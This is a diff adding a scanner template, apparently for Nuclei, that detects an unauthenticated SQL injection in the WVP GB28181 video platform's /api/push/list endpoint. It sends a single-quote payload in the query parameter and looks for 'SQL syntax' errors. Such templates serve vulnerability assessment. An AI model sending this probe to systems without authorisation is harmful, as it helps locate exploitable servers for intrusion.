@@ -1,0 +1,29 @@
+id: wvp-28181-sqi
+
+info:
+  name: WVP Sql Injection
+  author: qwtd
+  severity: high
+  description: |
+    WVP视频平台(国标28181)未授权接口/api/push/list存在SQL注入漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/3f0a45b0ae99cbabbc28e1dfb046e83e863e1026/WVP%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0/WVP%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0(%E5%9B%BD%E6%A0%8728181)%E6%9C%AA%E6%8E%88%E6%9D%83SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md?plain=1#L16
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  metadata:
+    max-request: 1
+  tags: WVP视频平台
+
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/api/push/list?page=1&count=15&query=1%27&pushing=&mediaServerId='
+
+    matchers:
+      - type: word
+        words:
+          - 'SQL syntax'
+        part: body
